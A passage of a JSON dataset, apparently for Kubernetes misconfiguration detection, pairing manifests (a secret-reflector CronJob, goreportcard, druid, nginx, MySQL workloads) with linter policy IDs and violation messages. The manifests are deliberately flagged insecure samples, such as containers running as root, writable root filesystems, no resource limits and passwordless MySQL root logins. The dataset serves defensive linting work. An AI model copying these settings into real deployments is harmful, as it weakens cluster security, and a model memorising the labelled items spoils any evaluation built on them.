.metadata.uid)')\\\"\\n    secret_source_checksum=\\\"\\\n            $(echo \\\"${secret_source_content}\\\" | jq 'del(.metadata.namespace)' |\\\n            \\ md5sum | awk '{ print $1 }')\\\"\\n    for namespace in ${namespace_destination};\\\n            \\ do\\n        if kubectl get secret \\\"${secret}\\\" -n \\\"${namespace}\\\"\\\n            \\ >/dev/null 2>&1; then\\n            secret_dest_content=\\\"$(kubectl get\\\n            \\ secret \\\"${secret}\\\" -n \\\"${namespace}\\\" -o json | jq 'del(.metadata.managedFields,\\\n            \\ .metadata.creationTimestamp, .metadata.resourceVersion, .metadata.uid)')\\\"\\\n            \\n            secret_dest_checksum=\\\"$(echo \\\"${secret_dest_content}\\\"\\\n            \\ | jq 'del(.metadata.namespace)' | md5sum | awk '{ print $1 }')\\\"\\n \\\n            \\           if [ \\\"${secret_source_checksum}\\\" != \\\"${secret_dest_checksum}\\\"\\\n            \\ ]; then\\n                echo \\\"${secret_source_content}\\\" | \\\\\\n  \\\n            \\                  jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                    kubectl replace -n \\\"${namespace}\\\"\\\n            \\ -f -\\n            fi\\n        else\\n            echo \\\"${secret_source_content}\\\"\\\n            \\ | \\\\\\n                jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                kubectl apply -n \\\"${namespace}\\\"\\\n            \\ -f -\\n        fi\\n    done\\ndone\\n\"\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"secret-reflector\" has cpu request 0"
  },
  {
    "id": "7872",
    "manifest_path": "data/manifests/the_stack_sample/sample_2897.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: secret-reflector\n  namespace: networking\nspec:\n  jobTemplate:\n    template:\n      spec:\n        serviceAccountName: sa-secret-reflector\n        containers:\n        - name: secret-reflector\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.1\n          env:\n          - name: SECRETS\n            value: ${SECRET_DOMAIN/./-}-tls\n          command:\n          - /bin/sh\n          - -ec\n          - \"set -o nounset\\nset -o errexit\\n# space delimited secrets to copy\\nsecrets=\\\"\\\n            ${SECRETS}\\\"\\n# source namespace to reflect secret from\\nnamespace_source=\\\"\\\n            networking\\\"\\n# space delimited namespace where to reflect the secrets\\\n            \\ to\\nnamespace_destination=\\\"home media\\\"\\nfor secret in ${secrets};\\\n            \\ do\\n    secret_source_content=\\\"$(kubectl get secret \\\"${secret}\\\" -n\\\n            \\ \\\"${namespace_source}\\\" -o json | jq 'del(.metadata.managedFields, .metadata.creationTimestamp,\\\n            \\ .metadata.resourceVersion, .metadata.uid)')\\\"\\n    secret_source_checksum=\\\"\\\n            $(echo \\\"${secret_source_content}\\\" | jq 'del(.metadata.namespace)' |\\\n            \\ md5sum | awk '{ print $1 }')\\\"\\n    for namespace in ${namespace_destination};\\\n            \\ do\\n        if kubectl get secret \\\"${secret}\\\" -n \\\"${namespace}\\\"\\\n            \\ >/dev/null 2>&1; then\\n            secret_dest_content=\\\"$(kubectl get\\\n            \\ secret \\\"${secret}\\\" -n \\\"${namespace}\\\" -o json | jq 'del(.metadata.managedFields,\\\n            \\ .metadata.creationTimestamp, .metadata.resourceVersion, .metadata.uid)')\\\"\\\n            \\n            secret_dest_checksum=\\\"$(echo \\\"${secret_dest_content}\\\"\\\n            \\ | jq 'del(.metadata.namespace)' | md5sum | awk '{ print $1 }')\\\"\\n \\\n            \\           if [ \\\"${secret_source_checksum}\\\" != \\\"${secret_dest_checksum}\\\"\\\n            \\ ]; then\\n                echo \\\"${secret_source_content}\\\" | \\\\\\n  \\\n            \\                  jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                    kubectl replace -n \\\"${namespace}\\\"\\\n            \\ -f -\\n            fi\\n        else\\n            echo \\\"${secret_source_content}\\\"\\\n            \\ | \\\\\\n                jq -r --arg namespace \\\"$namespace\\\" '.metadata.namespace\\\n            \\ = $namespace' | \\\\\\n                kubectl apply -n \\\"${namespace}\\\"\\\n            \\ -f -\\n        fi\\n    done\\ndone\\n\"\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"secret-reflector\" has memory limit 0"
  },
  {
    "id": "7873",
    "manifest_path": "data/manifests/the_stack_sample/sample_2899.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goreportcard\n  labels:\n    app: goreportcard\n    app.kubernetes.io/name: goreportcard\n    app.kubernetes.io/component: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: goreportcard\n      app.kubernetes.io/name: goreportcard\n      app.kubernetes.io/component: web\n  template:\n    metadata:\n      labels:\n        app: goreportcard\n        app.kubernetes.io/name: goreportcard\n        app.kubernetes.io/component: web\n    spec:\n      containers:\n      - image: yeqown/goreportcard:v1.4.1\n        name: goreportcard\n        ports:\n        - containerPort: 8000\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8000\n        volumeMounts:\n        - name: goreportcard-configuration-volume\n          mountPath: /root\n      volumes:\n      - configMap:\n          name: goreportcard-configuration\n          items:\n          - key: ssh-pub\n            path: .ssh/id_rsa.pub\n          - key: goreportcard\n            path: goreportcard.toml\n        name: goreportcard-configuration-volume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"goreportcard\" does not have a read-only root file system"
  },
  {
    "id": "7874",
    "manifest_path": "data/manifests/the_stack_sample/sample_2899.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goreportcard\n  labels:\n    app: goreportcard\n    app.kubernetes.io/name: goreportcard\n    app.kubernetes.io/component: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: goreportcard\n      app.kubernetes.io/name: goreportcard\n      app.kubernetes.io/component: web\n  template:\n    metadata:\n      labels:\n        app: goreportcard\n        app.kubernetes.io/name: goreportcard\n        app.kubernetes.io/component: web\n    spec:\n      containers:\n      - image: yeqown/goreportcard:v1.4.1\n        name: goreportcard\n        ports:\n        - containerPort: 8000\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8000\n        volumeMounts:\n        - name: goreportcard-configuration-volume\n          mountPath: /root\n      volumes:\n      - configMap:\n          name: goreportcard-configuration\n          items:\n          - key: ssh-pub\n            path: .ssh/id_rsa.pub\n          - key: goreportcard\n            path: goreportcard.toml\n        name: goreportcard-configuration-volume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"goreportcard\" is not set to runAsNonRoot"
  },
  {
    "id": "7875",
    "manifest_path": "data/manifests/the_stack_sample/sample_2899.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goreportcard\n  labels:\n    app: goreportcard\n    app.kubernetes.io/name: goreportcard\n    app.kubernetes.io/component: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: goreportcard\n      app.kubernetes.io/name: goreportcard\n      app.kubernetes.io/component: web\n  template:\n    metadata:\n      labels:\n        app: goreportcard\n        app.kubernetes.io/name: goreportcard\n        app.kubernetes.io/component: web\n    spec:\n      containers:\n      - image: yeqown/goreportcard:v1.4.1\n        name: goreportcard\n        ports:\n        - containerPort: 8000\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8000\n        volumeMounts:\n        - name: goreportcard-configuration-volume\n          mountPath: /root\n      volumes:\n      - configMap:\n          name: goreportcard-configuration\n          items:\n          - key: ssh-pub\n            path: .ssh/id_rsa.pub\n          - key: goreportcard\n            path: goreportcard.toml\n        name: goreportcard-configuration-volume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"goreportcard\" has cpu request 0"
  },
  {
    "id": "7876",
    "manifest_path": "data/manifests/the_stack_sample/sample_2899.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goreportcard\n  labels:\n    app: goreportcard\n    app.kubernetes.io/name: goreportcard\n    app.kubernetes.io/component: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: goreportcard\n      app.kubernetes.io/name: goreportcard\n      app.kubernetes.io/component: web\n  template:\n    metadata:\n      labels:\n        app: goreportcard\n        app.kubernetes.io/name: goreportcard\n        app.kubernetes.io/component: web\n    spec:\n      containers:\n      - image: yeqown/goreportcard:v1.4.1\n        name: goreportcard\n        ports:\n        - containerPort: 8000\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8000\n        volumeMounts:\n        - name: goreportcard-configuration-volume\n          mountPath: /root\n      volumes:\n      - configMap:\n          name: goreportcard-configuration\n          items:\n          - key: ssh-pub\n            path: .ssh/id_rsa.pub\n          - key: goreportcard\n            path: goreportcard.toml\n        name: goreportcard-configuration-volume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"goreportcard\" has memory limit 0"
  },
  {
    "id": "7877",
    "manifest_path": "data/manifests/the_stack_sample/sample_2901.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: druid\n    druid_cr: druid-test\n    nodeSpecUniqueStr: druid-druid-test-brokers\n  name: druid-druid-test-brokers\n  namespace: test-namespace\n  annotations:\n    druidOpResourceHash: JvDKxq3cBaf0FBXMscfcQ/RXrcs=\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: druid\n      druid_cr: druid-test\n      nodeSpecUniqueStr: druid-druid-test-brokers\n  template:\n    metadata:\n      labels:\n        app: druid\n        druid_cr: druid-test\n        nodeSpecUniqueStr: druid-druid-test-brokers\n      annotations:\n        key1: value1\n        key2: value2\n    spec:\n      affinity: {}\n      containers:\n      - command:\n        - bin/run-druid.sh\n        - broker\n        image: himanshu01/druid:druid-0.12.0-1\n        name: druid-druid-test-brokers\n        env:\n        - name: configMapSHA\n          value: blah\n        ports:\n        - containerPort: 8083\n          name: random\n        readinessProbe:\n          httpGet:\n            path: /status\n            port: 8080\n        livenessProbe:\n          httpGet:\n            path: /status\n            port: 8080\n        resources:\n          limits:\n            cpu: '4'\n            memory: 2Gi\n          requests:\n            cpu: '4'\n            memory: 2Gi\n        volumeMounts:\n        - mountPath: /druid/conf/druid/_common\n          name: common-config-volume\n        - mountPath: /druid/conf/druid/broker\n          name: nodetype-config-volume\n        - mountPath: /druid/data\n          name: data-volume\n      securityContext:\n        fsGroup: 107\n        runAsUser: 106\n      volumes:\n      - configMap:\n          name: druid-test-druid-common-config\n        name: common-config-volume\n      - configMap:\n          name: druid-druid-test-brokers-config\n        name: nodetype-config-volume\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"druid-druid-test-brokers\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "7878",
    "manifest_path": "data/manifests/the_stack_sample/sample_2901.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: druid\n    druid_cr: druid-test\n    nodeSpecUniqueStr: druid-druid-test-brokers\n  name: druid-druid-test-brokers\n  namespace: test-namespace\n  annotations:\n    druidOpResourceHash: JvDKxq3cBaf0FBXMscfcQ/RXrcs=\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: druid\n      druid_cr: druid-test\n      nodeSpecUniqueStr: druid-druid-test-brokers\n  template:\n    metadata:\n      labels:\n        app: druid\n        druid_cr: druid-test\n        nodeSpecUniqueStr: druid-druid-test-brokers\n      annotations:\n        key1: value1\n        key2: value2\n    spec:\n      affinity: {}\n      containers:\n      - command:\n        - bin/run-druid.sh\n        - broker\n        image: himanshu01/druid:druid-0.12.0-1\n        name: druid-druid-test-brokers\n        env:\n        - name: configMapSHA\n          value: blah\n        ports:\n        - containerPort: 8083\n          name: random\n        readinessProbe:\n          httpGet:\n            path: /status\n            port: 8080\n        livenessProbe:\n          httpGet:\n            path: /status\n            port: 8080\n        resources:\n          limits:\n            cpu: '4'\n            memory: 2Gi\n          requests:\n            cpu: '4'\n            memory: 2Gi\n        volumeMounts:\n        - mountPath: /druid/conf/druid/_common\n          name: common-config-volume\n        - mountPath: /druid/conf/druid/broker\n          name: nodetype-config-volume\n        - mountPath: /druid/data\n          name: data-volume\n      securityContext:\n        fsGroup: 107\n        runAsUser: 106\n      volumes:\n      - configMap:\n          name: druid-test-druid-common-config\n        name: common-config-volume\n      - configMap:\n          name: druid-druid-test-brokers-config\n        name: nodetype-config-volume\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7879",
    "manifest_path": "data/manifests/the_stack_sample/sample_2901.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: druid\n    druid_cr: druid-test\n    nodeSpecUniqueStr: druid-druid-test-brokers\n  name: druid-druid-test-brokers\n  namespace: test-namespace\n  annotations:\n    druidOpResourceHash: JvDKxq3cBaf0FBXMscfcQ/RXrcs=\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: druid\n      druid_cr: druid-test\n      nodeSpecUniqueStr: druid-druid-test-brokers\n  template:\n    metadata:\n      labels:\n        app: druid\n        druid_cr: druid-test\n        nodeSpecUniqueStr: druid-druid-test-brokers\n      annotations:\n        key1: value1\n        key2: value2\n    spec:\n      affinity: {}\n      containers:\n      - command:\n        - bin/run-druid.sh\n        - broker\n        image: himanshu01/druid:druid-0.12.0-1\n        name: druid-druid-test-brokers\n        env:\n        - name: configMapSHA\n          value: blah\n        ports:\n        - containerPort: 8083\n          name: random\n        readinessProbe:\n          httpGet:\n            path: /status\n            port: 8080\n        livenessProbe:\n          httpGet:\n            path: /status\n            port: 8080\n        resources:\n          limits:\n            cpu: '4'\n            memory: 2Gi\n          requests:\n            cpu: '4'\n            memory: 2Gi\n        volumeMounts:\n        - mountPath: /druid/conf/druid/_common\n          name: common-config-volume\n        - mountPath: /druid/conf/druid/broker\n          name: nodetype-config-volume\n        - mountPath: /druid/data\n          name: data-volume\n      securityContext:\n        fsGroup: 107\n        runAsUser: 106\n      volumes:\n      - configMap:\n          name: druid-test-druid-common-config\n        name: common-config-volume\n      - configMap:\n          name: druid-druid-test-brokers-config\n        name: nodetype-config-volume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"druid-druid-test-brokers\" does not have a read-only root file system"
  },
  {
    "id": "7880",
    "manifest_path": "data/manifests/the_stack_sample/sample_2901.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: druid\n    druid_cr: druid-test\n    nodeSpecUniqueStr: druid-druid-test-brokers\n  name: druid-druid-test-brokers\n  namespace: test-namespace\n  annotations:\n    druidOpResourceHash: JvDKxq3cBaf0FBXMscfcQ/RXrcs=\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: druid\n      druid_cr: druid-test\n      nodeSpecUniqueStr: druid-druid-test-brokers\n  template:\n    metadata:\n      labels:\n        app: druid\n        druid_cr: druid-test\n        nodeSpecUniqueStr: druid-druid-test-brokers\n      annotations:\n        key1: value1\n        key2: value2\n    spec:\n      affinity: {}\n      containers:\n      - command:\n        - bin/run-druid.sh\n        - broker\n        image: himanshu01/druid:druid-0.12.0-1\n        name: druid-druid-test-brokers\n        env:\n        - name: configMapSHA\n          value: blah\n        ports:\n        - containerPort: 8083\n          name: random\n        readinessProbe:\n          httpGet:\n            path: /status\n            port: 8080\n        livenessProbe:\n          httpGet:\n            path: /status\n            port: 8080\n        resources:\n          limits:\n            cpu: '4'\n            memory: 2Gi\n          requests:\n            cpu: '4'\n            memory: 2Gi\n        volumeMounts:\n        - mountPath: /druid/conf/druid/_common\n          name: common-config-volume\n        - mountPath: /druid/conf/druid/broker\n          name: nodetype-config-volume\n        - mountPath: /druid/data\n          name: data-volume\n      securityContext:\n        fsGroup: 107\n        runAsUser: 106\n      volumes:\n      - configMap:\n          name: druid-test-druid-common-config\n        name: common-config-volume\n      - configMap:\n          name: druid-druid-test-brokers-config\n        name: nodetype-config-volume\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"druid-druid-test-brokers\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "7881",
    "manifest_path": "data/manifests/the_stack_sample/sample_2902.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8206\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7882",
    "manifest_path": "data/manifests/the_stack_sample/sample_2902.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8206\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7883",
    "manifest_path": "data/manifests/the_stack_sample/sample_2902.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8206\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7884",
    "manifest_path": "data/manifests/the_stack_sample/sample_2902.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8206\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7885",
    "manifest_path": "data/manifests/the_stack_sample/sample_2902.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8206\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7886",
    "manifest_path": "data/manifests/the_stack_sample/sample_2903.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-employees-deployment\n  labels:\n    app: mysql-employees\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: mysql-employees\n  template:\n    metadata:\n      labels:\n        app: mysql-employees\n    spec:\n      containers:\n      - name: mysql-employees\n        image: tdewin/mysql-employees\n        ports:\n        - name: mysql-employees\n          containerPort: 8080\n          protocol: TCP\n        env:\n        - name: MYSQL_DB\n          value: employees\n        - name: MYSQL_SERVER\n          value: tcp(mysql-demo:3306)\n        - name: MYSQL_USERNAME\n          value: root\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: mysql-root-password\n              name: mysql-demo\n        volumeMounts:\n        - name: mysql-configmap\n          mountPath: /usr/share/mysql-employees\n      volumes:\n      - name: mysql-configmap\n        configMap:\n          name: mysql-configmap\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mysql-employees\" is using an invalid container image, \"tdewin/mysql-employees\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7887",
    "manifest_path": "data/manifests/the_stack_sample/sample_2903.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-employees-deployment\n  labels:\n    app: mysql-employees\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: mysql-employees\n  template:\n    metadata:\n      labels:\n        app: mysql-employees\n    spec:\n      containers:\n      - name: mysql-employees\n        image: tdewin/mysql-employees\n        ports:\n        - name: mysql-employees\n          containerPort: 8080\n          protocol: TCP\n        env:\n        - name: MYSQL_DB\n          value: employees\n        - name: MYSQL_SERVER\n          value: tcp(mysql-demo:3306)\n        - name: MYSQL_USERNAME\n          value: root\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: mysql-root-password\n              name: mysql-demo\n        volumeMounts:\n        - name: mysql-configmap\n          mountPath: /usr/share/mysql-employees\n      volumes:\n      - name: mysql-configmap\n        configMap:\n          name: mysql-configmap\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7888",
    "manifest_path": "data/manifests/the_stack_sample/sample_2903.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-employees-deployment\n  labels:\n    app: mysql-employees\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: mysql-employees\n  template:\n    metadata:\n      labels:\n        app: mysql-employees\n    spec:\n      containers:\n      - name: mysql-employees\n        image: tdewin/mysql-employees\n        ports:\n        - name: mysql-employees\n          containerPort: 8080\n          protocol: TCP\n        env:\n        - name: MYSQL_DB\n          value: employees\n        - name: MYSQL_SERVER\n          value: tcp(mysql-demo:3306)\n        - name: MYSQL_USERNAME\n          value: root\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: mysql-root-password\n              name: mysql-demo\n        volumeMounts:\n        - name: mysql-configmap\n          mountPath: /usr/share/mysql-employees\n      volumes:\n      - name: mysql-configmap\n        configMap:\n          name: mysql-configmap\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysql-employees\" does not have a read-only root file system"
  },
  {
    "id": "7889",
    "manifest_path": "data/manifests/the_stack_sample/sample_2903.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-employees-deployment\n  labels:\n    app: mysql-employees\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: mysql-employees\n  template:\n    metadata:\n      labels:\n        app: mysql-employees\n    spec:\n      containers:\n      - name: mysql-employees\n        image: tdewin/mysql-employees\n        ports:\n        - name: mysql-employees\n          containerPort: 8080\n          protocol: TCP\n        env:\n        - name: MYSQL_DB\n          value: employees\n        - name: MYSQL_SERVER\n          value: tcp(mysql-demo:3306)\n        - name: MYSQL_USERNAME\n          value: root\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: mysql-root-password\n              name: mysql-demo\n        volumeMounts:\n        - name: mysql-configmap\n          mountPath: /usr/share/mysql-employees\n      volumes:\n      - name: mysql-configmap\n        configMap:\n          name: mysql-configmap\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysql-employees\" is not set to runAsNonRoot"
  },
  {
    "id": "7890",
    "manifest_path": "data/manifests/the_stack_sample/sample_2903.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-employees-deployment\n  labels:\n    app: mysql-employees\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: mysql-employees\n  template:\n    metadata:\n      labels:\n        app: mysql-employees\n    spec:\n      containers:\n      - name: mysql-employees\n        image: tdewin/mysql-employees\n        ports:\n        - name: mysql-employees\n          containerPort: 8080\n          protocol: TCP\n        env:\n        - name: MYSQL_DB\n          value: employees\n        - name: MYSQL_SERVER\n          value: tcp(mysql-demo:3306)\n        - name: MYSQL_USERNAME\n          value: root\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: mysql-root-password\n              name: mysql-demo\n        volumeMounts:\n        - name: mysql-configmap\n          mountPath: /usr/share/mysql-employees\n      volumes:\n      - name: mysql-configmap\n        configMap:\n          name: mysql-configmap\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysql-employees\" has cpu request 0"
  },
  {
    "id": "7891",
    "manifest_path": "data/manifests/the_stack_sample/sample_2903.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-employees-deployment\n  labels:\n    app: mysql-employees\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: mysql-employees\n  template:\n    metadata:\n      labels:\n        app: mysql-employees\n    spec:\n      containers:\n      - name: mysql-employees\n        image: tdewin/mysql-employees\n        ports:\n        - name: mysql-employees\n          containerPort: 8080\n          protocol: TCP\n        env:\n        - name: MYSQL_DB\n          value: employees\n        - name: MYSQL_SERVER\n          value: tcp(mysql-demo:3306)\n        - name: MYSQL_USERNAME\n          value: root\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: mysql-root-password\n              name: mysql-demo\n        volumeMounts:\n        - name: mysql-configmap\n          mountPath: /usr/share/mysql-employees\n      volumes:\n      - name: mysql-configmap\n        configMap:\n          name: mysql-configmap\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysql-employees\" has memory limit 0"
  },
  {
    "id": "7892",
    "manifest_path": "data/manifests/the_stack_sample/sample_2905.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: pinger\n  labels:\n    app: pinger\nspec:\n  selector:\n    app: pinger\n  ports:\n  - protocol: TCP\n    port: 8080\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:pinger])"
  },
  {
    "id": "7893",
    "manifest_path": "data/manifests/the_stack_sample/sample_2906.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: initdbd-deploy\n  labels:\n    app: initdbd\n    version: v1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: initdbd\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: initdbd\n        version: v1\n    spec:\n      containers:\n      - name: initdbd\n        image: mysql:8.0\n        imagePullPolicy: Always\n        env:\n        - name: MYSQL_SVC\n          value: $(MYSQL_SVC)\n        command:\n        - bash\n        - -c\n        - \"while true;do\\n  echo \\\"${MYSQL_SVC}\\\"\\n\\n  if [[ $(mysql -h \\\"${MYSQL_SVC}\\\"\\\n          \\ -uroot -e \\\"use test_db;show tables;\\\") ]]; then\\n    sleep 100s\\n   \\\n          \\ continue\\n  fi\\n\\n  if [ -d /initdbd ]; then\\n    cd /initdbd\\n    mysql\\\n          \\ -h \\\"${MYSQL_SVC}\\\" -uroot < ping_table.sql\\n    mysql -h \\\"${MYSQL_SVC}\\\"\\\n          \\ -uroot < user_table.sql\\n    mysql -h \\\"${MYSQL_SVC}\\\" -uroot -e \\\"use\\\n          \\ test_db;show tables;\\\"\\n  fi\\n\\n  sleep 1s\\ndone\\n\"\n        volumeMounts:\n        - name: initdbd-vol\n          mountPath: /initdbd\n      volumes:\n      - name: initdbd-vol\n        hostPath:\n          path: /var/lib/mysqlx/initdbd-debug\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initdbd\" does not have a read-only root file system"
  },
  {
    "id": "7894",
    "manifest_path": "data/manifests/the_stack_sample/sample_2906.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: initdbd-deploy\n  labels:\n    app: initdbd\n    version: v1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: initdbd\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: initdbd\n        version: v1\n    spec:\n      containers:\n      - name: initdbd\n        image: mysql:8.0\n        imagePullPolicy: Always\n        env:\n        - name: MYSQL_SVC\n          value: $(MYSQL_SVC)\n        command:\n        - bash\n        - -c\n        - \"while true;do\\n  echo \\\"${MYSQL_SVC}\\\"\\n\\n  if [[ $(mysql -h \\\"${MYSQL_SVC}\\\"\\\n          \\ -uroot -e \\\"use test_db;show tables;\\\") ]]; then\\n    sleep 100s\\n   \\\n          \\ continue\\n  fi\\n\\n  if [ -d /initdbd ]; then\\n    cd /initdbd\\n    mysql\\\n          \\ -h \\\"${MYSQL_SVC}\\\" -uroot < ping_table.sql\\n    mysql -h \\\"${MYSQL_SVC}\\\"\\\n          \\ -uroot < user_table.sql\\n    mysql -h \\\"${MYSQL_SVC}\\\" -uroot -e \\\"use\\\n          \\ test_db;show tables;\\\"\\n  fi\\n\\n  sleep 1s\\ndone\\n\"\n        volumeMounts:\n        - name: initdbd-vol\n          mountPath: /initdbd\n      volumes:\n      - name: initdbd-vol\n        hostPath:\n          path: /var/lib/mysqlx/initdbd-debug\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"initdbd\" is not set to runAsNonRoot"
  },
  {
    "id": "7895",
    "manifest_path": "data/manifests/the_stack_sample/sample_2906.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: initdbd-deploy\n  labels:\n    app: initdbd\n    version: v1\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: initdbd\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: initdbd\n        version: v1\n    spec:\n      containers:\n      - name: initdbd\n        image: mysql:8.0\n        imagePullPolicy: Always\n        env:\n        - name: MYSQL_SVC\n          value: $(MYSQL_SVC)\n        command:\n        - bash\n        - -c\n        - \"while true;do\\n  echo \\\"${MYSQL_SVC}\\\"\\n\\n  if [[ $(mysql -h \\\"${MYSQL_SVC}\\\"\\\n          \\ -uroot -e \\\"use test_db;show tables;\\\") ]]; then\\n    sleep 100s\\n   \\\n          \\ continue\\n  fi\\n\\n  if [ -d /initdbd ]; then\\n    cd /initdbd\\n    mysql\\\n          \\ -h \\\"${MYSQL_SVC}\\\" -uroot < ping_table.sql\\n    mysql -h \\\"${MYSQL_SVC}\\\"\\\n          \\ -uroot < user_table.sql\\n    mysql -h \\\"${MYSQL_SVC}\\\" -uroot -e \\\"use\\\n          \\ test_db;show tables;\\\"\\n  fi\\n\\n  sleep 1s\\ndone\\n\"\n        volumeMounts:\n        - name: initdbd-vol\n          mountPath: /initdbd\n      volumes:\n      - name: initdbd-vol\n        